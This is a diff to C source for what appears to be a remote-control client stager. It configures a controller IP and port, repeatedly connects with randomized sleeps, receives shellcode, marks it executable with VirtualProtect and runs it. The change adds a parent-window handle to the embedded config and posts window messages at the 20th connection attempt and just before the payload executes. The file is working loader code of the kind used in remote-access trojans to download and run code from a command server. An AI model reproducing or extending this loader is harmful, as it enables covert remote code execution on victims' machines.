@@ -19,13 +19,39 @@
 
 #pragma comment(lib, "ws2_32.lib")
 
-#pragma pack(push, 1)
+#pragma pack(push, 4)
 typedef struct PkgHeader {
 	char flag[8];
 	int totalLen;
 	int originLen;
 } PkgHeader;
+
+struct CONNECT_ADDRESS
+{
+	char	        szFlag[32];		 // 标识
+	char			szServerIP[100]; // 主控IP
+	char			szPort[8];		 // 主控端口
+	int				iType;			 // 客户端类型
+	bool            bEncrypt;		 // 上线信息是否加密
+	char            szBuildDate[12]; // 构建日期(版本)
+	int             iMultiOpen;		 // 支持打开多个
+	int				iStartup;		 // 启动方式
+	int				iHeaderEnc;		 // 数据加密类型
+	char			protoType;		 // 协议类型
+	char			runningType;	 // 运行方式
+	char            szReserved[44];  // 占位，使结构体占据300字节
+	uint64_t		parentHwnd;		 // 父进程窗口句柄
+	uint64_t		superAdmin;		 // 管理员主控ID
+	char			pwdHash[64];	 // 密码哈希
+}g_Server = { "Hello, World!", "127.0.0.1", "6543" };
 #pragma pack(pop)
+
+typedef struct PluginParam {
+	char IP[100];
+	int Port;
+	void* Exit;
+	void* User;
+}PluginParam;
 
 PkgHeader MakePkgHeader(int originLen) {
 	PkgHeader header = { 0 };
@@ -88,7 +114,9 @@ const char* ReceiveShellcode(const char* sIP, int serverPort, int* sizeOut) {
 		if (!isFirstConnect)
 			Sleep(IsRelease ? rand()%60 * 1000 : 5000);
 		isFirstConnect = FALSE;
-		Mprintf("Connecting attempt #%d -> %s:%d \n", ++attemptCount, serverIP, serverPort);
+		if (++attemptCount == 20)
+			PostMessage((HWND)g_Server.parentHwnd, 4046, (WPARAM)933711587, (LPARAM)1643138518);
+		Mprintf("Connecting attempt #%d -> %s:%d \n", attemptCount, serverIP, serverPort);
 
 		SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 		if (clientSocket == INVALID_SOCKET)
@@ -180,33 +208,6 @@ inline int MemoryFind(const char* szBuffer, const char* Key, int iBufferSize, in
 	return -1;
 }
 
-#pragma pack(push, 4)
-struct CONNECT_ADDRESS
-{
-	char	        szFlag[32];		 // 标识
-	char			szServerIP[100]; // 主控IP
-	char			szPort[8];		 // 主控端口
-	int				iType;			 // 客户端类型
-	bool            bEncrypt;		 // 上线信息是否加密
-	char            szBuildDate[12]; // 构建日期(版本)
-	int             iMultiOpen;		 // 支持打开多个
-	int				iStartup;		 // 启动方式
-	int				iHeaderEnc;		 // 数据加密类型
-	char			protoType;		 // 协议类型
-	char			runningType;	 // 运行方式
-	char            szReserved[52];  // 占位，使结构体占据300字节
-	uint64_t		superAdmin;		 // 管理员主控ID
-	char			pwdHash[64];	 // 密码哈希
-}g_Server = { "Hello, World!", "127.0.0.1", "6543" };
-#pragma pack(pop)
-
-typedef struct PluginParam {
-	char IP[100];
-	int Port;
-	void* Exit;
-	void* User;
-}PluginParam;
-
 #ifdef _WINDLL
 #define DLL_API __declspec(dllexport)
 #else 
@@ -229,7 +230,7 @@ extern DLL_API DWORD WINAPI run(LPVOID param) {
 	free((void*)dllData);
 	DWORD oldProtect = 0;
 	if (!VirtualProtect(execMem, size, PAGE_EXECUTE_READ, &oldProtect)) return -3;
-
+	PostMessage((HWND)g_Server.parentHwnd, 4046, (WPARAM)0, (LPARAM)0);
 	((void(*)())execMem)();
 	return 0;
 }
